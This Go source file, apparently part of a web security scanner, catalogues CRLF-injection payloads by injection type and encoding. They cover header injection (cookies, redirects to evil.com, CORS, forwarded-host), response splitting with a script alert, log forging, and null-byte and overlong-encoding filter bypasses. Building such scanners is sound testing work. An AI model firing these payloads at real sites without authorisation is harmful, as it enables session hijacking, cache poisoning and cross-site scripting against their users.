// Package crlf provides CRLF Injection payloads for header injection and response splitting.
// Payloads are categorized by:
//   - Injection type (Header injection, Response splitting)
//   - Encoding technique (URL encoded, double encoded, Unicode)
//   - Target header patterns
package crlf

// InjectionType represents the type of CRLF injection.
type InjectionType string

const (
	// InjectionHeader is for HTTP header injection.
	InjectionHeader InjectionType = "header"
	// InjectionResponseSplit is for HTTP response splitting.
	InjectionResponseSplit InjectionType = "response_split"
	// InjectionLogForging is for log file injection.
	InjectionLogForging InjectionType = "log_forging"
)

// EncodingType represents the encoding technique used.
type EncodingType string

const (
	// EncodingNone is raw CRLF characters.
	EncodingNone EncodingType = "none"
	// EncodingURL is URL-encoded CRLF.
	EncodingURL EncodingType = "url"
	// EncodingDouble is double URL-encoded CRLF.
	EncodingDouble EncodingType = "double"
	// EncodingUnicode uses Unicode representations.
	EncodingUnicode EncodingType = "unicode"
	// EncodingMixed uses mixed encoding techniques.
	EncodingMixed EncodingType = "mixed"
)

// Payload represents a CRLF injection payload.
type Payload struct {
	Value          string
	InjectionType  InjectionType
	EncodingType   EncodingType
	Description    string
	InjectedHeader string // The header being injected
}

// GetPayloads returns all CRLF payloads.
func GetPayloads() []Payload {
	return allPayloads
}

// GetHeaderInjectionPayloads returns payloads for header injection.
func GetHeaderInjectionPayloads() []Payload {
	var result []Payload
	for _, p := range allPayloads {
		if p.InjectionType == InjectionHeader {
			result = append(result, p)
		}
	}
	return result
}

// GetResponseSplitPayloads returns payloads for response splitting.
func GetResponseSplitPayloads() []Payload {
	var result []Payload
	for _, p := range allPayloads {
		if p.InjectionType == InjectionResponseSplit {
			result = append(result, p)
		}
	}
	return result
}

// GetPayloadsByEncoding returns payloads filtered by encoding type.
func GetPayloadsByEncoding(encoding EncodingType) []Payload {
	var result []Payload
	for _, p := range allPayloads {
		if p.EncodingType == encoding {
			result = append(result, p)
		}
	}
	return result
}

// CRLFSequences returns common CRLF character sequences for detection.
func CRLFSequences() []string {
	return []string{
		"\r\n",
		"\r",
		"\n",
		"%0d%0a",
		"%0D%0A",
		"%0d",
		"%0D",
		"%0a",
		"%0A",
		"%250d%250a",
		"%250D%250A",
		"\\r\\n",
	}
}

// InjectionMarker returns a unique marker to detect in responses.
func InjectionMarker() string {
	return "X-CRLF-Injection-Test"
}

// All CRLF payloads.
// Source: PayloadsAllTheThings, HackTricks, OWASP Testing Guide
var allPayloads = []Payload{
	// Basic URL-encoded CRLF header injection
	{
		Value:          "%0d%0aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "Basic Set-Cookie injection",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%0d%0aX-Injected:header",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "Custom header injection",
		InjectedHeader: "X-Injected",
	},
	{
		Value:          "%0d%0aLocation:https://evil.com",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "Location header injection",
		InjectedHeader: "Location",
	},
	{
		Value:          "%0d%0aContent-Type:text/html",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "Content-Type injection",
		InjectedHeader: "Content-Type",
	},
	{
		Value:          "%0d%0aContent-Length:0",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "Content-Length injection",
		InjectedHeader: "Content-Length",
	},
	{
		Value:          "%0d%0aAccess-Control-Allow-Origin:*",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "CORS header injection",
		InjectedHeader: "Access-Control-Allow-Origin",
	},

	// Double URL-encoded CRLF
	{
		Value:          "%250d%250aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingDouble,
		Description:    "Double encoded Set-Cookie",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%250d%250aX-Injected:header",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingDouble,
		Description:    "Double encoded custom header",
		InjectedHeader: "X-Injected",
	},
	{
		Value:          "%25250d%25250aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingDouble,
		Description:    "Triple encoded Set-Cookie",
		InjectedHeader: "Set-Cookie",
	},

	// CR only or LF only
	{
		Value:          "%0dSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "CR only header injection",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%0aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "LF only header injection",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%0a%0dSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "LF-CR header injection",
		InjectedHeader: "Set-Cookie",
	},

	// Unicode/UTF-8 encoded
	{
		Value:          "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingUnicode,
		Description:    "Unicode CRLF Set-Cookie",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%c0%8d%c0%8aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingUnicode,
		Description:    "Overlong UTF-8 CRLF",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "\u560d\u560aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingUnicode,
		Description:    "Unicode character CRLF",
		InjectedHeader: "Set-Cookie",
	},

	// Response splitting (full HTTP response)
	{
		Value:          "%0d%0a%0d%0a<html><body>Injected</body></html>",
		InjectionType:  InjectionResponseSplit,
		EncodingType:   EncodingURL,
		Description:    "Basic response splitting",
		InjectedHeader: "",
	},
	{
		Value:          "%0d%0a%0d%0a<script>alert(1)</script>",
		InjectionType:  InjectionResponseSplit,
		EncodingType:   EncodingURL,
		Description:    "XSS via response splitting",
		InjectedHeader: "",
	},
	{
		Value:          "%0d%0aContent-Length:35%0d%0a%0d%0a<html><body>Injected</body></html>",
		InjectionType:  InjectionResponseSplit,
		EncodingType:   EncodingURL,
		Description:    "Response split with Content-Length",
		InjectedHeader: "Content-Length",
	},
	{
		Value:          "%0d%0aContent-Type:text/html%0d%0aContent-Length:25%0d%0a%0d%0a<script>alert(1)</script>",
		InjectionType:  InjectionResponseSplit,
		EncodingType:   EncodingURL,
		Description:    "Full response splitting",
		InjectedHeader: "Content-Type",
	},

	// Mixed encoding
	{
		Value:          "%0D%0ASet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingMixed,
		Description:    "Uppercase encoded CRLF",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%0d%0ASet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingMixed,
		Description:    "Mixed case CRLF",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%%0d0d%%0a0aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingMixed,
		Description:    "Malformed percent encoding",
		InjectedHeader: "Set-Cookie",
	},

	// Header value injection (when injecting into existing header value)
	{
		Value:          "value%0d%0aX-Injected:header",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "Value prefix header injection",
		InjectedHeader: "X-Injected",
	},
	{
		Value:          "normal%0d%0aSet-Cookie:session=evil",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "Session cookie injection",
		InjectedHeader: "Set-Cookie",
	},

	// Cache poisoning payloads
	{
		Value:          "%0d%0aX-Forwarded-Host:evil.com",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "X-Forwarded-Host injection",
		InjectedHeader: "X-Forwarded-Host",
	},
	{
		Value:          "%0d%0aX-Forwarded-For:127.0.0.1",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingURL,
		Description:    "X-Forwarded-For injection",
		InjectedHeader: "X-Forwarded-For",
	},

	// Log forging payloads
	{
		Value:          "%0d%0aFake-Log-Entry:malicious",
		InjectionType:  InjectionLogForging,
		EncodingType:   EncodingURL,
		Description:    "Log forging attempt",
		InjectedHeader: "",
	},
	{
		Value:          "value%0d%0a[ERROR] Fake log entry",
		InjectionType:  InjectionLogForging,
		EncodingType:   EncodingURL,
		Description:    "Fake error log entry",
		InjectedHeader: "",
	},

	// Bypass patterns
	{
		Value:          "%00%0d%0aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingMixed,
		Description:    "Null byte prefix bypass",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%0d%00%0aSet-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingMixed,
		Description:    "Null byte between CR LF",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%0d%0a%20Set-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingMixed,
		Description:    "Space after CRLF",
		InjectedHeader: "Set-Cookie",
	},
	{
		Value:          "%0d%0a%09Set-Cookie:crlf=injection",
		InjectionType:  InjectionHeader,
		EncodingType:   EncodingMixed,
		Description:    "Tab after CRLF",
		InjectedHeader: "Set-Cookie",
	},
}
